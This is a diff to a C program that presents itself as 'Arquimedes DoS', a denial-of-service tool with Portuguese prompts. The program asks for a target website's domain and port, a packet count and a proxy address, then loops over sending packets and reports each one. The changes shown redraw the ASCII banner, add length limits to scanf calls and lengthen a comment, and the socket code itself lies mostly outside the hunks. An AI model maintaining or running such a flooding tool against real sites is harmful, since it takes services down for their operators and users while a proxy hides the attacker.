@@ -7,20 +7,24 @@
 #include <netinet/in.h>
 
 void banner() {
-    printf("\n"
-           "/\\  _ __ __ _ _   () __ ___   ___  | | ___  ___\n"
-           "//_\\| '/ | | | | | '_ _ \\ / _ / ` |/ _ / __|\n"
-           "/  _  \\ | | (| | || | | | | | | | |  / (| |  _/_\n"
-           "_/ _/|  _, |_,||| || |_|_|_,|_||/ ||\n"
-           "                    ___      __\n"
-           "                   /   ___ / \\\n"
-           "                  / /\\ / _ \\ \\\n"
-           "                 / /// () |\\ \\\n"
-           "                /,' _/__/\n\n"
-           "🌀 Arquimedes Dos 🌀\n"
-           "🪓 By Jhon Lamdenberguer 🪓\n"
-           "📱 Team Família Flodder Techno 📱\n"
-           "============================\n");
+    printf(
+        "   _                   _                    _           \n"
+        "  /_\\  _ __ __ _ _   _(_)_ __ ___   ___  __| | ___  ___ \n"
+        " //_\\\\| '__/ _` | | | | | '_ ` _ \\ / _ \\/ _` |/ _ \\/ __|\n"
+        "/  _  \\ | | (_| | |_| | | | | | | |  __/ (_| |  __/\\__ \\\n"
+        "\\_/ \\_/_|  \\__, |\\__,_|_|_| |_| |_|\\___|\\__,_|\\___||___/\n"
+        "             |_|                                        \n"
+        "    ___      __                                         \n"
+        "   /   \\___ / _\\                                        \n"
+        "  / /\\ / _ \\\\ \\                                         \n"
+        " / /_// (_) |\\ \\                                        \n"
+        "/___,' \\___/\\__/                                        \n"
+        "\n"
+        "🌀 Arquimedes Dos 🌀\n"
+        "🪓 By Jhon Lamdenberguer 🪓\n"
+        "📱 Team Família Flodder Techno 📱\n"
+        "============================\n"
+    );
 }
 
 int main() {
@@ -34,13 +38,13 @@ int main() {
 
     printf("∆tack DoS Arquimedes\n");
     printf("Domínio do site -> ");
-    scanf("%s", host);
+    scanf("%255s", host);
     printf("Porta do site -> ");
     scanf("%d", &port);
     printf("Quantidade de packtes -> ");
     scanf("%d", &total_packets);
     printf("Ip da sua proxy -> ");
-    scanf("%s", proxy_ip);
+    scanf("%99s", proxy_ip);
     printf("Porta da sua proxy -> ");
     scanf("%d", &proxy_port);
 
@@ -75,7 +79,7 @@ int main() {
 
         printf("Arquimedes DoS.c ---> %d Packtes enviados para %s porta %d\n", i, host, port);
         close(sock);
-        usleep(100000); // delay
+        usleep(100000); // delay de 0.1 segundos
     }
 
     return 0;
